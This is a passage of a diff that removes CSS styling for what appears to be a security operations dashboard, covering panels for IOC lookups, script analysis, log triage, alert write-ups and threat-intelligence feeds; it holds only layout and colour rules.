-.ct-tool-type { font-size:10px; color:rgba(56,189,248,0.7); margin-top:2px; }
-.ct-test-btn,.ct-del-btn { font-size:11px; padding:4px 10px; border-radius:8px; cursor:pointer; border:1px solid var(--border); background:transparent; color:var(--text); }
-.ct-test-btn:hover { background:rgba(56,189,248,0.10); border-color:rgba(56,189,248,0.30); color:var(--accent); }
-.ct-del-btn:hover { background:rgba(248,113,113,0.10); border-color:rgba(248,113,113,0.30); color:#f87171; }
-
-/* Log Triage */
-#lt-input { min-height:180px; font-family:'Cascadia Code','Fira Code','Courier New',monospace; font-size:12px; }
-
-/* ═══════════════════════════════════════════════════════════════
-   BULK IOC RESULTS — grouped display
-   ═══════════════════════════════════════════════════════════════ */
-.bulk-summary {
-  font-size: 13px; color: var(--muted); padding: 8px 2px 12px;
-}
-.bulk-summary strong { color: var(--text); }
-
-.bulk-group {
-  background: var(--bg2); border: 1px solid var(--border);
-  border-radius: var(--radius2); overflow: hidden; margin-bottom: 10px;
-}
-.bulk-group-head {
-  display: flex; align-items: center; justify-content: space-between;
-  padding: 9px 14px; font-size: 12px; font-weight: 700;
-  background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border);
-}
-.bulk-count {
-  font-size: 10px; font-weight: 700; padding: 1px 6px; border-radius: 5px;
-  background: rgba(255,255,255,0.08); color: var(--muted); margin-left: 6px;
-}
-.bulk-item {
-  display: flex; flex-direction: column; gap: 6px;
-  padding: 10px 14px; border-bottom: 1px solid var(--border);
-}
-.bulk-item:last-child { border-bottom: none; }
-.bulk-links { display: flex; flex-wrap: wrap; gap: 5px; }
-
-/* ═══════════════════════════════════════════════════════════════
-   SCRIPT ANALYZER — indicator cards, MITRE grid, decode layers
-   ═══════════════════════════════════════════════════════════════ */
-.sa-indicators { display: flex; flex-direction: column; gap: 1px; background: var(--border); }
-
-.sa-indicator {
-  padding: 10px 14px; background: var(--bg2);
-  border-left: 3px solid transparent;
-  display: flex; flex-direction: column; gap: 5px;
-}
-.sa-ind-head {
-  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
-}
-.sa-ind-sev {
-  font-size: 11px; font-weight: 800; white-space: nowrap; flex-shrink: 0;
-}
-.sa-ind-label { font-size: 12px; color: var(--text); flex: 1; }
-.sa-ind-matches { display: flex; flex-wrap: wrap; gap: 5px; }
-.sa-ind-mitre  { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 2px; }
-
-.sa-match {
-  font-size: 10px; font-family: monospace; background: rgba(0,0,0,0.28);
-  padding: 2px 6px; border-radius: 5px; color: #fca5a5; word-break: break-all;
-}
-
-/* severity summary pills in verdict bar */
-.sa-sev-pills { display: flex; flex-wrap: wrap; gap: 5px; }
-.sa-sev-pill  {
-  font-size: 10px; font-weight: 700; padding: 3px 8px;
-  border-radius: 7px; border: 1px solid; white-space: nowrap;
-}
-
-/* section count badge */
-.sa-section-count {
-  font-size: 10px; font-weight: 700; padding: 1px 7px; border-radius: 5px;
-  background: rgba(56,189,248,0.15); color: var(--accent); margin-left: 7px;
-}
-
-/* MITRE technique grid */
-.sa-mitre-grid {
-  display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-  gap: 1px; background: var(--border);
-}
-.sa-mitre-card {
-  display: flex; flex-direction: column; gap: 3px; padding: 10px 12px;
-  background: var(--bg2); text-decoration: none; transition: background 0.13s;
-}
-.sa-mitre-card:hover { background: rgba(56,189,248,0.07); }
-.sa-mitre-tid  { font-size: 11px; font-weight: 800; color: var(--accent); }
-.sa-mitre-name { font-size: 11px; color: var(--muted); line-height: 1.4; }
-
-/* decode layers */
-.sa-decode-layer {
-  padding: 10px 14px; border-bottom: 1px solid var(--border);
-}
-.sa-decode-layer:last-child { border-bottom: none; }
-.sa-decode-label {
-  font-size: 11px; font-weight: 700; color: var(--muted);
-  text-transform: uppercase; letter-spacing: 0.4px; margin-bottom: 6px;
-}
-.sa-code {
-  font-family: 'Cascadia Code','Fira Code','Courier New', monospace;
-  font-size: 11px; color: #a5f3fc; background: rgba(0,0,0,0.25);
-  border: 1px solid rgba(56,189,248,0.12); border-radius: 9px;
-  padding: 10px 12px; white-space: pre-wrap; word-break: break-all;
-  line-height: 1.6; max-height: 260px; overflow-y: auto;
-}
-
-/* high-entropy warning block */
-.sa-entropy-warn { border-color: rgba(251,191,36,0.3) !important; }
-
-/* IOC pivot link inside script analyzer */
-.sa-pivot-link {
-  font-size: 10px; padding: 2px 7px; border-radius: 6px;
-  border: 1px solid rgba(56,189,248,0.22);
-  background: rgba(56,189,248,0.07); color: var(--accent);
-  text-decoration: none; white-space: nowrap; transition: background 0.12s;
-}
-.sa-pivot-link:hover { background: rgba(56,189,248,0.18); }
-
-/* ═══════════════════════════════════════════════════════════════
-   ALERT WRITE-UP — template list items, form grid, labels
-   ═══════════════════════════════════════════════════════════════ */
-.aw-tpl-item {
-  display: flex; align-items: flex-start; gap: 10px;
-  padding: 10px 12px; border-bottom: 1px solid var(--border);
-  cursor: pointer; transition: background 0.12s;
-}
-.aw-tpl-item:hover  { background: rgba(56,189,248,0.06); }
-.aw-tpl-item.active { background: rgba(56,189,248,0.12); border-left: 3px solid var(--accent); }
-.aw-tpl-icon  { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
-.aw-tpl-meta  { display: flex; flex-direction: column; gap: 4px; flex: 1; min-width: 0; }
-.aw-tpl-name  { font-size: 12px; font-weight: 700; color: var(--text); line-height: 1.3; }
-.aw-tpl-tags  { display: flex; flex-wrap: wrap; gap: 4px; align-items: center; }
-
-/* write-up form two-column grid on wide screens */
-.aw-form-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-  gap: 10px;
-}
-/* notes field spans full width */
-.aw-form-grid .aw-field:has(textarea) { grid-column: 1 / -1; }
-
-/* field label (used inside form-grid) */
-.aw-label {
-  font-size: 11px; font-weight: 700; color: var(--muted);
-  text-transform: uppercase; letter-spacing: 0.4px; margin-bottom: 3px;
-  display: block;
-}
-
-/* ═══════════════════════════════════════════════════════════════
-   LOG TRIAGE — inline action buttons
-   ═══════════════════════════════════════════════════════════════ */
-.lt-pivot-btn, .lt-case-btn {
-  font-size: 10px; padding: 3px 8px; border-radius: 7px;
-  border: 1px solid var(--border); background: rgba(255,255,255,0.04);
-  color: var(--text); cursor: pointer; white-space: nowrap;
-  transition: all 0.13s;
-}
-.lt-pivot-btn:hover { background: rgba(56,189,248,0.10); border-color: rgba(56,189,248,0.30); color: var(--accent); }
-.lt-case-btn:hover  { background: rgba(52,211,153,0.10); border-color: rgba(52,211,153,0.30); color: #34d399; }
-
-/* ═══════════════════════════════════════════════════════════════
-   LOG TRIAGE — improved verdict / findings render
-   ═══════════════════════════════════════════════════════════════ */
-.lt-verdict-bar {
-  display: flex; flex-direction: column; gap: 8px;
-  border: 1px solid; border-radius: 10px; padding: 14px 16px;
-  margin-bottom: 12px;
-}
-.lt-verdict-left { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-.lt-ev-badge, .lt-sev-badge {
-  font-size: 11px; font-weight: 700; letter-spacing: 0.4px;
-  padding: 3px 10px; border-radius: 20px; border: 1px solid;
-}
-.lt-verdict-indicators {
-  display: flex; flex-wrap: wrap; gap: 6px; margin-top: 4px;
-}
-.lt-ind-chip {
-  font-size: 11px; padding: 2px 8px; border-radius: 6px;
-  background: rgba(255,255,255,0.05); border: 1px solid var(--border);
-  color: var(--text-muted); white-space: nowrap;
-}
-.lt-findings-list { display: flex; flex-direction: column; gap: 5px; }
-.lt-finding {
-  font-size: 12px; padding: 7px 10px; border-radius: 7px;
-  border-left: 3px solid; line-height: 1.5;
-}
-.lt-finding-critical { border-color: #f87171; background: rgba(248,113,113,0.08); color: #fca5a5; }
-.lt-finding-warn     { border-color: #fbbf24; background: rgba(251,191,36,0.08); color: #fde68a; }
-.lt-finding-info     { border-color: #38bdf8; background: rgba(56,189,248,0.06); color: #7dd3fc; }
-.lt-prefill-hint {
-  font-size: 12px; margin-top: 12px; padding: 10px 14px;
-  border-radius: 8px; border: 1px solid rgba(251,191,36,0.3);
-  background: rgba(251,191,36,0.07); color: #fde68a; line-height: 1.5;
-}
-.lt-prefill-hint strong { color: #fbbf24; }
-
-/* ═══════════════════════════════════════════════════════════════
-   SOC UTILITIES TAB
-   ═══════════════════════════════════════════════════════════════ */
-.utils-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-  gap: 16px; padding: 4px 0;
-}
-.utils-card {
-  background: var(--card); border: 1px solid var(--border);
-  border-radius: 12px; padding: 16px; display: flex; flex-direction: column; gap: 8px;
-}
-.utils-card-wide { grid-column: 1 / -1; }
-.utils-card-head {
-  font-size: 13px; font-weight: 700; color: var(--text);
-  margin-bottom: 2px; letter-spacing: 0.2px;
-}
-.utils-card-desc { font-size: 11px; color: var(--muted); margin: 0; line-height: 1.5; }
-.utils-card textarea, .utils-card .aw-input {
-  width: 100%; min-height: 68px; resize: vertical;
-  background: var(--bg); border: 1px solid var(--border);
-  border-radius: 7px; padding: 8px 10px; color: var(--text);
-  font-family: var(--mono); font-size: 12px; line-height: 1.5;
-  outline: none; transition: border 0.15s;
-  box-sizing: border-box;
-}
-.utils-card textarea:focus, .utils-card .aw-input:focus {
-  border-color: var(--accent);
-}
-.utils-card .aw-input { min-height: unset; padding: 7px 10px; }
-.utils-actions {
-  display: flex; flex-wrap: wrap; gap: 6px;
-}
-.utils-actions button {
-  font-size: 11px; padding: 5px 11px; border-radius: 7px;
-  border: 1px solid var(--border); background: rgba(255,255,255,0.04);
-  color: var(--text); cursor: pointer; transition: all 0.13s; white-space: nowrap;
-}
-.utils-actions button:hover { background: rgba(56,189,248,0.10); border-color: rgba(56,189,248,0.30); color: var(--accent); }
-.utils-output-box {
-  background: var(--bg); border: 1px solid var(--border); border-radius: 7px;
-  padding: 10px 12px; font-size: 12px; line-height: 1.6;
-  color: var(--text); min-height: 38px;
-}
-.utils-note-count {
-  font-size: 10px; color: var(--muted); text-align: right;
-}
-#util-notes { min-height: 160px; }
-#util-b64-output, #util-url-output, #util-str-output, #util-hex-output { min-height: 56px; }
-
-/* Regex IOC Hunter layout */
-.regex-hunter-layout { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-@media (max-width: 800px) { .regex-hunter-layout { grid-template-columns: 1fr; } }
-.regex-results {
-  background: var(--bg); border: 1px solid var(--border);
-  border-radius: 7px; padding: 10px; font-size: 12px;
-  overflow-y: auto; max-height: 320px; min-height: 100px;
-}
-.regex-found-count { font-size: 11px; color: var(--muted); margin-bottom: 8px; }
-.regex-group { margin-bottom: 10px; }
-.regex-group-label {
-  font-size: 11px; font-weight: 700; margin-bottom: 4px; letter-spacing: 0.3px;
-}
-.regex-ioc-row code {
-  font-size: 11px; color: var(--text); word-break: break-all;
-  display: block; padding: 2px 0;
-}
-.bulk-empty { color: var(--muted); font-size: 12px; padding: 10px 0; }
-
-/* Quick pivot launcher */
-.quicklinks-grid {
-  display: flex; flex-wrap: wrap; gap: 6px; padding-top: 2px;
-}
-.quicklink-btn {
-  font-size: 11px; padding: 5px 11px; border-radius: 7px;
-  border: 1px solid var(--border); background: rgba(255,255,255,0.04);
-  color: var(--text); cursor: pointer; transition: all 0.13s;
-  text-decoration: none; white-space: nowrap;
-}
-.quicklink-btn:hover { background: rgba(56,189,248,0.10); border-color: rgba(56,189,248,0.30); color: var(--accent); }
-
-/* ═══════════════════════════════════════════════════════════════
-   DOMAIN AGE BADGE
-   ═══════════════════════════════════════════════════════════════ */
-.domain-age-badge {
-  font-size: 12px; padding: 8px 12px; border-radius: 8px;
-  border: 1px solid; background: rgba(56,189,248,0.07);
-  border-color: rgba(56,189,248,0.25); color: #7dd3fc;
-  margin-bottom: 8px; line-height: 1.6;
-}
-.domain-age-new { border-color: rgba(248,113,113,0.4) !important; background: rgba(248,113,113,0.08) !important; color: #fca5a5 !important; }
-.verdict-critical { display:flex; flex-direction:column; gap:6px; }
-.verdict-critical span { font-size:12px; color:#f87171; font-weight:700; }
-
-/* ═══════════════════════════════════════════════════════════════
-   BULK IMPROVEMENTS — per-item pivot + export bar
-   ═══════════════════════════════════════════════════════════════ */
-.bulk-ioc-row-head { display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:4px; }
-.bulk-ioc-row-head .bulk-ioc-val { flex:1; font-size:12px; font-family:var(--mono); word-break:break-all; }
-.bulk-export-bar { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; }
-.bulk-exp-btn {
-  font-size:11px; padding:4px 10px; border-radius:7px;
-  border:1px solid var(--border); background:rgba(255,255,255,0.04);
-  color:var(--text); cursor:pointer; transition:all 0.13s;
-}
-.bulk-exp-btn:hover { background:rgba(56,189,248,0.10); border-color:rgba(56,189,248,0.30); color:var(--accent); }
-
-/* ═══════════════════════════════════════════════════════════════
-   CTI FEED TAB
-   ═══════════════════════════════════════════════════════════════ */
-.cti-subtab-bar {
-  display:flex; flex-wrap:wrap; gap:6px; margin-top:12px; padding-bottom:4px;
-}
-.cti-sub-btn {
-  font-size:12px; padding:7px 14px; border-radius:20px;
-  border:1px solid var(--border); background:transparent;
-  color:var(--muted); cursor:pointer; transition:all 0.15s; white-space:nowrap;
-}
-.cti-sub-btn.active, .cti-sub-btn:hover {
-  background:var(--accent); color:#0f172a; border-color:var(--accent); font-weight:700;
-}
-.cti-panel { margin-top:16px; }
-
-/* Feeds grid */
-.cti-feed-controls { display:flex; align-items:center; gap:12px; margin-bottom:14px; flex-wrap:wrap; }
-.cti-feed-status { font-size:11px; color:var(--muted); }
-.cti-feeds-grid {
-  display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:12px;
-}
-.cti-feed-card {
-  background:var(--card); border:1px solid; border-radius:10px; padding:14px;
-  display:flex; flex-direction:column; gap:8px;
-}
-.cti-feed-head { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
-.cti-feed-icon { font-size:18px; }
-.cti-feed-name { font-weight:700; font-size:13px; flex:1; }
-.cti-feed-badge { font-size:10px; padding:2px 8px; border-radius:20px; border:1px solid; white-space:nowrap; }
-.cti-feed-meta { font-size:11px; color:var(--muted); line-height:1.5; }
-.cti-feed-meta code { font-size:10px; color:var(--text); background:rgba(255,255,255,0.05); padding:1px 4px; border-radius:4px; }
-.cti-feed-actions { display:flex; gap:6px; }
-
-/* Actor intel */
-.cti-search-row { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px; }
-.cti-actor-results { display:flex; flex-direction:column; gap:14px; }
-.cti-actor-card {
-  background:var(--card); border:1px solid var(--border); border-radius:12px; padding:16px;
-  display:flex; flex-direction:column; gap:10px;
-}
-.cti-actor-head { display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:8px; }
-.cti-actor-name { font-size:18px; font-weight:800; color:var(--text); }
-.cti-actor-aliases { font-size:11px; color:var(--muted); margin-top:2px; }
-.cti-actor-badges { display:flex; flex-wrap:wrap; gap:5px; }
-.cti-actor-badge { font-size:10px; padding:3px 10px; border-radius:20px; border:1px solid; font-weight:700; white-space:nowrap; }
-.cti-actor-desc { font-size:12px; color:var(--text-muted); line-height:1.65; }
-.cti-actor-grid { display:flex; flex-direction:column; gap:5px; }
-.cti-actor-row { font-size:12px; display:flex; gap:8px; }
-.cti-actor-label { color:var(--muted); min-width:80px; font-weight:700; }
-.cti-actor-ttps { display:flex; flex-wrap:wrap; gap:6px; }
-.cti-actor-actions { display:flex; gap:8px; flex-wrap:wrap; }
-
-/* IOC intel check */
-.cti-ioc-check-layout { margin-bottom:14px; }
-.cti-ioc-results { margin-top:12px; }
-.cti-ioc-header {
-  display:flex; align-items:center; gap:10px; padding:10px 14px;
-  border:1px solid; border-radius:10px; margin-bottom:12px; flex-wrap:wrap;
-}
-.cti-ioc-links-grid {
-  display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:8px; margin-bottom:14px;
-}
-.cti-ioc-link-card {
-  background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px 12px;
-  text-decoration:none; color:var(--text); transition:all 0.13s; cursor:pointer;
-  display:flex; justify-content:space-between; align-items:center;
-}
-.cti-ioc-link-card:hover { border-color:var(--accent); background:rgba(56,189,248,0.07); }
-.cti-ioc-link-name { font-size:12px; font-weight:700; }
-.cti-ioc-link-action { font-size:11px; color:var(--muted); }
-.cti-ioc-hints { margin-top:8px; display:flex; flex-direction:column; gap:4px; }
-.cti-ioc-hint-head { font-size:12px; font-weight:700; color:var(--muted); margin-bottom:4px; }
-
-/* Campaign tracker */
-.cti-campaigns-header { margin-bottom:14px; }
-.cti-campaigns-header h4 { margin:0 0 4px; font-size:15px; }
-.cti-campaigns-list { display:flex; flex-direction:column; gap:10px; margin-bottom:14px; }
-.cti-camp-card {
-  background:var(--card); border:1px solid var(--border); border-radius:10px; padding:14px;
-  display:flex; flex-direction:column; gap:8px;
-}
-.cti-camp-head { display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:6px; }
-.cti-camp-name { font-weight:700; font-size:14px; }
-.cti-camp-actor { font-size:11px; color:var(--muted); }
-.cti-camp-iocs { font-size:11px; }
-.cti-camp-ioc-label { font-weight:700; color:var(--muted); font-size:10px; text-transform:uppercase; margin-bottom:4px; }
-.cti-camp-add-ioc { display:flex; gap:6px; }
-.cti-camp-actions { display:flex; gap:8px; padding-top:4px; }
-
-/* Resources grid */
-.cti-resources-grid { display:flex; flex-direction:column; gap:20px; }
-.cti-res-section {}
-.cti-res-head { font-size:13px; font-weight:700; color:var(--text); margin-bottom:8px; padding-bottom:6px; border-bottom:1px solid var(--border); }
-
-
-/* ═══════════════════════════════════════════════════════════════
-   THREAT SCORE PANEL
-   ═══════════════════════════════════════════════════════════════ */
-/* ── Quick Threat Assessment Banner ─────────────────────────── */
-.threat-score-panel {
-  border: 1px solid var(--border);
-  border-radius: 10px;
-  overflow: hidden;
-  margin-bottom: 4px;
-}
-.ts-banner {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  padding: 7px 12px;
-  cursor: pointer;
-  user-select: none;
-  background: rgba(255,255,255,0.02);
-  transition: background 0.12s;
-  flex-wrap: wrap;
-}
-.ts-banner:hover { background: rgba(56,189,248,0.05); }
-.ts-banner-label {
-  font-size: 10px;
-  font-weight: 700;
-  color: var(--muted);
-  text-transform: uppercase;
-  letter-spacing: 0.6px;
-  white-space: nowrap;
-  flex-shrink: 0;
-}
-.ts-overall-badge {
-  font-size: 10px;
-  padding: 2px 9px;
-  border-radius: 20px;
-  border: 1px solid;
-  font-weight: 700;
-  white-space: nowrap;
-  flex-shrink: 0;
-}
-.ts-pill-row {
-  display: flex;
-  align-items: center;
-  gap: 5px;
-  flex-wrap: wrap;
-  flex: 1;
-}
-.ts-pill {
-  font-size: 10px;
-  padding: 2px 9px;
-  border-radius: 20px;
-  border: 1px solid var(--border);
-  background: rgba(255,255,255,0.03);
-  color: var(--text);
-  text-decoration: none;
-  white-space: nowrap;
-  transition: background 0.12s, border-color 0.12s;
-  display: inline-flex;
-  align-items: center;
-  gap: 4px;
-}
-.ts-pill:hover { background: rgba(56,189,248,0.10); border-color: rgba(56,189,248,0.35); color: #38bdf8; }
-.ts-toggle {
-  font-size: 10px;
-  color: var(--muted);
-  flex-shrink: 0;
-  margin-left: auto;
-  transition: transform 0.18s;
-}
-.ts-toggle.open { transform: rotate(180deg); }
-/* Expanded panel */
-.ts-body {
-  display: none;
-  padding: 4px 10px 8px;
-  border-top: 1px solid var(--border);
-  background: rgba(0,0,0,0.12);
-}
-.ts-body.visible { display: block; }
-.ts-grid { display: flex; flex-direction: column; gap: 1px; }
-.ts-row {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  padding: 5px 8px;
-  border-radius: 6px;
-  text-decoration: none;
-  color: var(--text);
-  transition: background 0.1s;
-  border: 1px solid transparent;
-}
-.ts-row:hover { background: rgba(56,189,248,0.07); border-color: rgba(56,189,248,0.18); }
-.ts-row-icon { font-size: 13px; flex-shrink: 0; width: 18px; text-align: center; }
-.ts-row-label { font-weight: 700; font-size: 11px; flex-shrink: 0; min-width: 120px; }
-.ts-row-context { font-size: 10px; color: var(--muted); flex: 1; }
-.ts-row-hint {
-  font-size: 9px;
-  color: var(--muted);
-  background: rgba(255,255,255,0.04);
-  padding: 1px 7px;
-  border-radius: 20px;
-  border: 1px solid var(--border);
-  white-space: nowrap;
-}
-.ts-context-note {
-  font-size: 10px;
-  color: var(--muted);
-  padding: 5px 8px 3px;
-  border-top: 1px solid var(--border);
-  margin-top: 4px;
-  line-height: 1.5;
-}
-
-/* ═══════════════════════════════════════════════════════════════
-   ALERT CONTEXT SUMMARY (Log Triage)
-   ═══════════════════════════════════════════════════════════════ */
-.lt-context-summary {
-  background: rgba(56,189,248,0.04);
-  border: 1px solid;
-  border-radius: 12px;
-  padding: 14px 16px;
-  margin-bottom: 14px;
-}
-.lt-ctx-head {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin-bottom: 10px;
-}
-.lt-ctx-icon { font-size: 16px; }
-.lt-ctx-title {
-  font-weight: 800;
-  font-size: 13px;
-  flex: 1;
-  color: var(--text);
-}
-.lt-ctx-copy {
-  background: transparent;
-  border: 1px solid var(--border);
-  border-radius: 6px;
-  color: var(--muted);
-  cursor: pointer;
-  font-size: 12px;
-  padding: 2px 8px;
-  transition: all 0.12s;
-}
-.lt-ctx-copy:hover { border-color: var(--accent); color: var(--accent); }
-.lt-ctx-body { display: flex; flex-direction: column; gap: 5px; }
-.lt-ctx-line {
-  font-size: 12px;
-  color: var(--text);
-  line-height: 1.55;
-  padding: 3px 8px;
-  border-radius: 5px;
-}
-.lt-ctx-line-head {
-  font-weight: 800;
-  font-size: 13px;
-  color: var(--text);
-  background: rgba(255,255,255,0.04);
-  padding: 5px 10px;
-}
-.lt-ctx-line-critical {
-  color: #f87171;
-  background: rgba(248,113,113,0.08);
-  border-left: 3px solid #f87171;
-  padding-left: 10px;
-}
-.lt-ctx-line-warn {
-  color: #fbbf24;
-  background: rgba(251,191,36,0.08);
-  border-left: 3px solid #fbbf24;
-  padding-left: 10px;
-}
-.lt-ctx-line-action {
-  font-weight: 700;
-  color: var(--accent);
-  background: rgba(56,189,248,0.08);
-  border-left: 3px solid var(--accent);
-  padding-left: 10px;
-}
-body.light .lt-context-summary { background: rgba(56,189,248,0.06); }
-
-/* ═══════════════════════════════════════════════════════════════
-   FEATURE 11: ALERT CATEGORY + INVESTIGATION STEPS
-   ═══════════════════════════════════════════════════════════════ */
-.lt-investig-steps {
-  background: var(--bg2);
-  border: 1px solid;
-  border-radius: 12px;
-  padding: 14px 16px;
-  margin-bottom: 12px;
-}
-.lt-investig-head {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  font-weight: 800;
-  font-size: 13px;
-  margin-bottom: 10px;
-}
-.lt-investig-copy {
-  background: transparent;
-  border: 1px solid var(--border);
-  border-radius: 6px;
-  color: var(--muted);
-  cursor: pointer;
-  font-size: 11px;
-  padding: 2px 8px;
-  transition: all 0.12s;
-}
-.lt-investig-copy:hover { border-color: var(--accent); color: var(--accent); }
-.lt-steps-list {
-  margin: 0;
-  padding-left: 20px;
-  display: flex;
-  flex-direction: column;
-  gap: 6px;
-}
-.lt-step-item {
-  font-size: 12px;
-  color: var(--text);
-  line-height: 1.55;
-  padding: 4px 0;
-}
-.lt-step-item::marker { color: var(--accent); font-weight: 700; }
-
-/* ═══════════════════════════════════════════════════════════════
-   FEATURE 10: FP/TP VERDICT TEMPLATES
-   ═══════════════════════════════════════════════════════════════ */
-.lt-verdict-templates {
-  background: var(--bg2);
-  border: 1px solid var(--border);
-  border-radius: 12px;
-  padding: 14px 16px;
-  margin-bottom: 14px;
-}
-.lt-vt-head {
-  font-weight: 800;
-  font-size: 13px;
-  margin-bottom: 4px;
-}
-.lt-vt-sub { font-weight: 400; font-size: 11px; color: var(--muted); margin-left: 6px; }
-.lt-vt-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 10px;
-  margin-top: 10px;
-}
-@media (max-width: 700px) { .lt-vt-grid { grid-template-columns: 1fr; } }
-.lt-vt-card {
-  border-radius: 10px;
-  padding: 12px;
-  border: 1px solid;
-}
-.lt-vt-fp { border-color: #34d39955; background: #34d3990a; }
-.lt-vt-tp { border-color: #f8717155; background: #f871710a; }
-.lt-vt-label {
-  font-weight: 800;
-  font-size: 12px;
-  margin-bottom: 8px;
-}
-.lt-vt-fp .lt-vt-label { color: #34d399; }
-.lt-vt-tp .lt-vt-label { color: #f87171; }
-.lt-vt-body {
-  font-size: 11px;
-  color: var(--text);
-  line-height: 1.6;
-  background: rgba(0,0,0,0.15);
-  padding: 8px 10px;
-  border-radius: 6px;
-  margin-bottom: 8px;
-  white-space: pre-wrap;
-  word-break: break-word;
-}
-body.light .lt-vt-body { background: rgba(0,0,0,0.05); }
-.lt-vt-copy-btn {
-  font-size: 11px;
-  padding: 4px 12px;
-  border-radius: 6px;
-  border: 1px solid var(--border);
-  background: transparent;
-  color: var(--text);
-  cursor: pointer;
-  transition: all 0.12s;
-  width: 100%;
-}
-.lt-vt-copy-btn:hover { border-color: var(--accent); color: var(--accent); }
-
-/* Alert category badge in context summary header */
-.lt-cat-badge {
-  font-size: 11px;
-  padding: 2px 10px;
-  border-radius: 20px;
-  border: 1px solid;
-  font-weight: 700;
-  white-space: nowrap;
-}
-.lt-ctx-line-meta { font-size: 11px; color: var(--muted); font-style: italic; }
-
-/* ═══════════════════════════════════════════════════════════════
-   FEATURE 13: IOC HISTORY ENHANCEMENTS
-   ═══════════════════════════════════════════════════════════════ */
-.history-item {
-  padding: 8px 10px;
-  border-radius: 8px;
-  border: 1px solid var(--border);
-  margin-bottom: 6px;
-  background: var(--bg2);
-  transition: border-color 0.12s;
-}
-.history-item:hover { border-color: rgba(56,189,248,0.4); }
-.history-item-top {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  flex-wrap: wrap;
-  margin-bottom: 4px;
-  cursor: pointer;
-}
-.history-item-val {
-  font-family: monospace;
-  font-size: 11px;
-  color: var(--text);
-  word-break: break-all;
-  cursor: pointer;
-  padding: 2px 0;
-}
-.history-item-actions {
-  display: flex;
-  gap: 4px;
-  margin-top: 6px;
-  flex-wrap: wrap;
-}
-.hist-verdict-btn, .hist-del-btn {
-  font-size: 10px;
-  padding: 2px 7px;
-  border-radius: 4px;
-  border: 1px solid var(--border);
-  background: transparent;
-  color: var(--muted);
-  cursor: pointer;
-  transition: all 0.1s;
-}
-.hist-verdict-btn:hover { border-color: var(--accent); color: var(--accent); }
-.hist-del-btn:hover { border-color: #f87171; color: #f87171; }
-.history-verdict {
-  font-size: 10px;
-  padding: 1px 7px;
-  border-radius: 20px;
-  border: 1px solid;
-  font-weight: 700;
-  white-space: nowrap;
-}
-.history-count {
-  font-size: 10px;
-  color: var(--muted);
-  background: rgba(255,255,255,0.06);
-  padding: 1px 6px;
-  border-radius: 20px;
-  border: 1px solid var(--border);
-}
-.history-time { font-size: 10px; color: var(--muted); margin-left: auto; white-space: nowrap; }
-
-/* ═══════════════════════════════════════════════════════════════
-   FEATURE 14: THREAT ACTOR HINT PANEL
-   ═══════════════════════════════════════════════════════════════ */
-.actor-hint-panel {
-  display: flex;
-  flex-direction: column;
-  gap: 8px;
-  margin-bottom: 2px;
-}
-.actor-hint-card {
-  background: var(--bg2);
-  border: 1px solid;
-  border-radius: 12px;
-  padding: 12px 14px;
-  box-shadow: var(--shadow);
-}
-.actor-hint-head {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin-bottom: 8px;
-  flex-wrap: wrap;
-}
-.actor-hint-icon { font-size: 16px; flex-shrink: 0; }
-.actor-hint-name { font-weight: 800; font-size: 14px; flex: 1; }
-.actor-hint-nation {
-  font-size: 10px;
-  padding: 2px 8px;
-  border-radius: 20px;
-  border: 1px solid;
-  font-weight: 700;
-}
-.actor-hint-meta {
-  display: flex;
-  flex-direction: column;
-  gap: 3px;
-  font-size: 11px;
-  color: var(--text);
-  margin-bottom: 8px;
-}
-.actor-hint-meta span { opacity: 0.85; }
-.actor-hint-links { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px; }
-.actor-hint-link {
-  font-size: 11px;
-  padding: 3px 10px;
-  border-radius: 20px;
-  border: 1px solid var(--border);
-  color: var(--accent);
-  text-decoration: none;
-  transition: all 0.12s;
-}
-.actor-hint-link:hover { background: rgba(56,189,248,0.1); border-color: var(--accent); }
-.actor-hint-note {
-  font-size: 10px;
-  color: var(--muted);
-  font-style: italic;
-  border-top: 1px solid var(--border);
-  padding-top: 6px;
-}
-
-/* ═══════════════════════════════════════════════════════════════
-   CTI THREAT NEWS PANEL
-   ═══════════════════════════════════════════════════════════════ */
-.cti-news-header {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 12px 16px 10px;
-  border-bottom: 1px solid var(--border);
-  gap: 12px;
-  flex-wrap: wrap;
-}
-.cti-news-header-left { flex: 1; min-width: 0; }
-.cti-news-title {
-  display: block;
-  font-size: 13px;
-  font-weight: 800;
-  color: var(--text);
-}
-.cti-news-subtitle {
-  display: block;
-  font-size: 10px;
-  color: var(--muted);
-  margin-top: 1px;
-}
-.cti-news-controls {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  flex-shrink: 0;
-}
-.cti-news-select {
-  background: var(--bg2);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  color: var(--text);
-  font-size: 11px;
-  padding: 5px 10px;
-  cursor: pointer;
-  outline: none;
-}
-.cti-news-select:focus { border-color: #38bdf8; }
-.cti-news-btn {
-  background: linear-gradient(135deg, #0ea5e9, #6366f1);
-  border: none;
-  border-radius: 8px;
-  color: #fff;
